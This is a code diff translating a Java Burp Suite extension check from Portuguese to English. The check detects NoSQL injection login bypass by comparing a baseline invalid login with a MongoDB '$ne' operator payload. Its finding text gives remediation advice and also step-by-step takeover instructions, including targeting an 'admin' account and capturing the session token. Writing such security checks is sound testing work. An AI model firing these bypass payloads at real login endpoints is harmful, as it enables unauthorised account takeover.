@@ -12,21 +12,20 @@ import java.util.List;
 import java.util.regex.Pattern;
 
 /**
- * Testa bypass de autenticação via operadores de NoSQL (estilo MongoDB,
- * ex: $ne, $gt) em endpoints de login: compara a resposta de um login
- * claramente inválido (baseline) com a resposta usando operadores de
- * injeção — se o comportamento mudar de "negado" para "sucesso", é um
- * forte indício de NoSQL Injection.
+ * Tests authentication bypass via NoSQL operators (MongoDB-style, e.g. $ne,
+ * $gt) on login endpoints: compares the response of a clearly invalid login
+ * (baseline) with the response using injection operators — if the behavior
+ * changes from "denied" to "success", that's a strong sign of NoSQL Injection.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class NoSqlInjectionCheck implements VulnCheck {
 
     private static final String[] PATHS = {"/api/login", "/api/v1/login", "/api/auth/login", "/login"};
 
-    private static final String USUARIO_INEXISTENTE = "rx0_usuario_que_nao_existe_" + System.currentTimeMillis();
+    private static final String NONEXISTENT_USER = "rx0_user_that_does_not_exist_" + System.currentTimeMillis();
 
-    private static final Pattern[] ASSINATURAS_SUCESSO = {
+    private static final Pattern[] SUCCESS_SIGNATURES = {
             Pattern.compile("\"(token|access_token|jwt|session)\"\\s*:\\s*\"[^\"]{10,}", Pattern.CASE_INSENSITIVE),
             Pattern.compile("\"success\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
             Pattern.compile("\"authenticated\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
@@ -34,70 +33,70 @@ public class NoSqlInjectionCheck implements VulnCheck {
     };
 
     @Override
-    public String nome() {
-        return "NoSQL Injection (bypass de autenticação estilo MongoDB)";
+    public String name() {
+        return "NoSQL Injection (MongoDB-style authentication bypass)";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
         for (String path : PATHS) {
             try {
                 String url = base + path;
 
-                // 1) Baseline: login claramente inválido com valores normais de string
-                String corpoBaseline = "{\"username\":\"" + USUARIO_INEXISTENTE + "\",\"password\":\"senha_errada_123\"}";
-                HttpRequest reqBaseline = HttpRequest.httpRequestFromUrl(url)
+                // 1) Baseline: clearly invalid login with normal string values
+                String baselineBody = "{\"username\":\"" + NONEXISTENT_USER + "\",\"password\":\"wrong_password_123\"}";
+                HttpRequest baselineReq = HttpRequest.httpRequestFromUrl(url)
                         .withMethod("POST")
                         .withAddedHeader("Content-Type", "application/json")
-                        .withBody(corpoBaseline);
-                HttpResponse respBaseline = api.http().sendRequest(reqBaseline).response();
-                if (respBaseline == null) continue;
-                boolean baselineParecesucesso = corpoIndicaSucesso(respBaseline.bodyToString());
-                if (baselineParecesucesso) continue; // esse endpoint sempre "sucede", sinal ruidoso — pula
+                        .withBody(baselineBody);
+                HttpResponse baselineResp = api.http().sendRequest(baselineReq).response();
+                if (baselineResp == null) continue;
+                boolean baselineLooksSuccessful = bodyIndicatesSuccess(baselineResp.bodyToString());
+                if (baselineLooksSuccessful) continue; // this endpoint always "succeeds" — noisy signal, skip
 
-                // 2) Payload de injeção: operadores $ne fazem a query aceitar "qualquer valor diferente de null"
-                String corpoInjetado = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
-                HttpRequest reqInjetado = HttpRequest.httpRequestFromUrl(url)
+                // 2) Injection payload: $ne operators make the query accept "any value other than null"
+                String injectedBody = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
+                HttpRequest injectedReq = HttpRequest.httpRequestFromUrl(url)
                         .withMethod("POST")
                         .withAddedHeader("Content-Type", "application/json")
-                        .withBody(corpoInjetado);
-                HttpResponse respInjetado = api.http().sendRequest(reqInjetado).response();
-                if (respInjetado == null) continue;
+                        .withBody(injectedBody);
+                HttpResponse injectedResp = api.http().sendRequest(injectedReq).response();
+                if (injectedResp == null) continue;
 
-                boolean injetadoParecesucesso = corpoIndicaSucesso(respInjetado.bodyToString())
-                        || (respInjetado.statusCode() == 200 && respBaseline.statusCode() != 200);
+                boolean injectedLooksSuccessful = bodyIndicatesSuccess(injectedResp.bodyToString())
+                        || (injectedResp.statusCode() == 200 && baselineResp.statusCode() != 200);
 
-                if (injetadoParecesucesso) {
-                    achados.add(new Finding(
-                            "Possível NoSQL Injection (bypass de login) em " + path,
-                            Severity.CRITICA,
+                if (injectedLooksSuccessful) {
+                    findings.add(new Finding(
+                            "Possible NoSQL Injection (login bypass) at " + path,
+                            Severity.CRITICAL,
                             url,
-                            "Um login com credenciais claramente inválidas foi rejeitado (status " + respBaseline.statusCode() +
-                                    "), mas o mesmo endpoint com operadores de NoSQL ($ne) no lugar dos valores retornou indícios de " +
-                                    "autenticação bem-sucedida (status " + respInjetado.statusCode() + "). Isso sugere que a query ao banco " +
-                                    "NoSQL está sendo montada diretamente a partir do JSON do usuário, sem sanitização.",
-                            "Baseline: " + corpoBaseline + " -> " + respBaseline.statusCode() +
-                                    " | Payload: " + corpoInjetado + " -> " + respInjetado.statusCode(),
-                            "Nunca repasse o JSON do usuário diretamente para a query do banco. Valide o tipo de cada campo " +
-                                    "(rejeite objetos onde se espera string) e use bibliotecas de sanitização específicas para NoSQL (ex: mongo-sanitize).",
-                            "1) Reenvie o POST pra " + url + " com o corpo exato: " + corpoInjetado + " — isso já é o bypass completo, " +
-                                    "você está autenticado como o primeiro usuário que a query encontrar no banco. 2) Pra mirar numa conta " +
-                                    "específica, use {\"username\":\"admin\",\"password\":{\"$ne\":null}} (username exato + senha bypassed). " +
-                                    "3) Capture o token/sessão retornado como prova de takeover de conta."));
+                            "A login with clearly invalid credentials was rejected (status " + baselineResp.statusCode() +
+                                    "), but the same endpoint with NoSQL operators ($ne) in place of the values returned signs of " +
+                                    "successful authentication (status " + injectedResp.statusCode() + "). This suggests the query " +
+                                    "to the NoSQL database is built directly from the user's JSON, with no sanitization.",
+                            "Baseline: " + baselineBody + " -> " + baselineResp.statusCode() +
+                                    " | Payload: " + injectedBody + " -> " + injectedResp.statusCode(),
+                            "Never pass the user's JSON directly into the database query. Validate the type of each field " +
+                                    "(reject objects where a string is expected) and use NoSQL-specific sanitization libraries (e.g. mongo-sanitize).",
+                            "1) Resend the POST to " + url + " with the exact body: " + injectedBody + " — this is already a full bypass, " +
+                                    "you're authenticated as the first user the query finds in the database. 2) To target a " +
+                                    "specific account, use {\"username\":\"admin\",\"password\":{\"$ne\":null}} (exact username + bypassed password). " +
+                                    "3) Capture the returned token/session as proof of account takeover."));
                 }
             } catch (Exception e) {
-                api.logging().logToError("[Rx0] Erro no check de NoSQL Injection (" + path + "): " + e.getMessage());
+                api.logging().logToError("[Rx0] Error in NoSQL Injection check (" + path + "): " + e.getMessage());
             }
         }
-        return achados;
+        return findings;
     }
 
-    private boolean corpoIndicaSucesso(String body) {
+    private boolean bodyIndicatesSuccess(String body) {
         if (body == null) return false;
-        for (Pattern p : ASSINATURAS_SUCESSO) {
+        for (Pattern p : SUCCESS_SIGNATURES) {
             if (p.matcher(body).find()) return true;
         }
         return false;
